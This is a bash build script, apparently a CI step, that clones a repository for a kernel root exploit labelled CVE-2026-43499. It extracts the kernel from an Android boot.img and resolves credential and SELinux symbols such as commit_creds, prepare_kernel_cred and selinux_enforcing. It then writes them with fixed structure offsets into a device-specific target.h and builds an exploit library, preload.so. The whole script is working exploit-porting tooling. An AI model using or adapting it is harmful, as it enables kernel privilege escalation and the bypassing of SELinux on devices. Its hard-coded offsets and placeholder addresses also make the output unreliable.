#!/bin/bash
set -e
DEVICE="$1"
WORKSPACE="${GITHUB_WORKSPACE:-$(pwd)}"

echo "=== Cloning source ==="
git clone --depth 1 https://github.com/woshimaniubi8/CVE-2026-43499-root-KernelSU.git jailbreak
cd jailbreak

echo "=== Inspecting reference target.h ==="
REF_TARGET=$(find . -name "target.h" -not -path "./.git/*" | head -n1)
[ -n "$REF_TARGET" ] && head -n 60 "$REF_TARGET" || echo "[*] No reference found, using generic format"

echo "=== Extracting vmlinux from boot.img ==="
mkdir -p /tmp/kextract
cd /tmp/kextract

# 方法1: vmlinux-to-elf（变量正确展开）
python3 -c "
from vmlinux_to_elf.extract_vmlinux import extract_vmlinux
extract_vmlinux('$WORKSPACE/images/boot.img', 'vmlinux')
" 2>/dev/null || true

# 方法2: 手动解压（heredoc 用双引号确保变量展开）
if [ ! -f vmlinux ] || [ "$(stat -c%s vmlinux 2>/dev/null || echo 0)" -lt 1000000 ]; then
  echo "[!] vmlinux-to-elf failed, trying manual extraction..."
  
  python3 << PYEOF
import struct, os, subprocess

with open('$WORKSPACE/images/boot.img', 'rb') as f:
    hdr = f.read(2048)
    if hdr[:8] == b'ANDROID!':
        ks = struct.unpack('<I', hdr[8:12])[0]
        ps = struct.unpack('<I', hdr[36:40])[0]
        f.seek(ps)
        raw = f.read(ks)
    else:
        f.seek(0)
        raw = f.read()
    with open('/tmp/kextract/kernel_raw.gz', 'wb') as o:
        o.write(raw)

for cmd, name in [
    ('gzip -dc /tmp/kextract/kernel_raw.gz > /tmp/kextract/kernel_raw 2>/dev/null', 'gzip'),
    ('lz4 -dc /tmp/kextract/kernel_raw.gz > /tmp/kextract/kernel_raw 2>/dev/null', 'lz4'),
    ('zstd -dc /tmp/kextract/kernel_raw.gz > /tmp/kextract/kernel_raw 2>/dev/null', 'zstd'),
    ('xz -dc /tmp/kextract/kernel_raw.gz > /tmp/kextract/kernel_raw 2>/dev/null', 'xz'),
]:
    r = subprocess.run(cmd, shell=True)
    if r.returncode == 0 and os.path.getsize('/tmp/kextract/kernel_raw') > 1000000:
        print(f'[+] Decompressed with {name}')
        break
else:
    import shutil
    shutil.copy('/tmp/kextract/kernel_raw.gz', '/tmp/kextract/kernel_raw')
PYEOF

  if file /tmp/kextract/kernel_raw | grep -q ELF; then
    cp /tmp/kextract/kernel_raw /tmp/kextract/vmlinux
  else
    echo "[!] Manual extraction failed"
    exit 1
  fi
fi

VMLINUX_SIZE=$(stat -c%s /tmp/kextract/vmlinux 2>/dev/null || echo 0)
echo "[+] vmlinux extracted, size: $VMLINUX_SIZE"

echo "=== Extracting kernel symbols ==="
cd /tmp/kextract

# 内核基址
KERNEL_BASE=$(aarch64-linux-gnu-nm vmlinux 2>/dev/null | grep ' T _text$' | awk '{print "0x"$1}' | head -n1)
[ -z "$KERNEL_BASE" ] && KERNEL_BASE="0xffffffc008000000"
echo "[+] Kernel base: $KERNEL_BASE"

# 符号提取函数
get_sym() {
    local name="$1"
    local addr=$(aarch64-linux-gnu-nm vmlinux 2>/dev/null | grep " [Tt] $name\$" | awk '{print "0x"$1}' | head -n1)
    if [ -n "$addr" ] && [ "$addr" != "0x" ]; then
        python3 -c "print(hex($addr - $KERNEL_BASE))"
    else
        echo "0xDEADBEEF"
    fi
}

INIT_TASK=$(get_sym "init_task")
INIT_CRED=$(get_sym "init_cred")
COMMIT_CREDS=$(get_sym "commit_creds")
PREPARE_KERNEL_CRED=$(get_sym "prepare_kernel_cred")
OVERRIDE_CRED=$(get_sym "override_creds")
REVERT_CRED=$(get_sym "revert_creds")
SELINUX_ENFORCING=$(get_sym "selinux_enforcing")
SELINUX_STATE=$(get_sym "selinux_state")
SELINUX_SS=$(get_sym "selinux_ss")
PIPE_BUF_OPS=$(get_sym "pipe_buf_ops")
ANON_PIPE_BUF_OPS=$(get_sym "anon_pipe_buf_ops")

echo "Symbols: INIT_TASK=$INIT_TASK INIT_CRED=$INIT_CRED COMMIT_CREDS=$COMMIT_CREDS SELINUX_ENFORCING=$SELINUX_ENFORCING"

echo "=== Generating target.h ==="
cd "$WORKSPACE/jailbreak"
mkdir -p "src/targets/$DEVICE"

cat > "src/targets/$DEVICE/target.h" << EOF
/* Auto-generated target.h for $DEVICE */
#ifndef TARGET_H
#define TARGET_H

#define KERNEL_BASE     ${KERNEL_BASE}ULL

#define INIT_TASK       ${INIT_TASK}
#define INIT_CRED       ${INIT_CRED}
#define COMMIT_CREDS    ${COMMIT_CREDS}
#define PREPARE_KERNEL_CRED ${PREPARE_KERNEL_CRED}
#define OVERRIDE_CRED   ${OVERRIDE_CRED}
#define REVERT_CRED     ${REVERT_CRED}

#define SELINUX_ENFORCING ${SELINUX_ENFORCING}
#define SELINUX_STATE   ${SELINUX_STATE}
#define SELINUX_SS      ${SELINUX_SS}

#define PIPE_BUF_OPS    ${PIPE_BUF_OPS}
#define ANON_PIPE_BUF_OPS ${ANON_PIPE_BUF_OPS}

#define TASK_STRUCT_PID_OFFSET      0x5E0
#define TASK_STRUCT_CRED_OFFSET     0x778
#define TASK_STRUCT_MM_OFFSET       0x520
#define TASK_STRUCT_COMM_OFFSET     0x7B0
#define TASK_STRUCT_FLAGS_OFFSET    0x448

#define RT_MUTEX_WAITER_LIST_OFFSET     0x00
#define RT_MUTEX_WAITER_PI_LIST_OFFSET  0x10
#define RT_MUTEX_WAITER_TASK_OFFSET     0x30

#define FUTEX_WAITER_LIST_OFFSET    0x18
#define PIPE_BUF_OFFSET             0x40
#define PIPE_BUF_OPS_OFFSET         0x58

#endif /* TARGET_H */
EOF

echo "[+] Generated target.h:"
cat "src/targets/$DEVICE/target.h"

echo "=== Building preload.so ==="
make PROJECT="$DEVICE" -j$(nproc)

echo "=== Copying outputs ==="
cp "build/$DEVICE/bin/preload.so" "$WORKSPACE/preload.so"
cp "src/targets/$DEVICE/target.h" "$WORKSPACE/target.h"
echo "[+] Build complete"
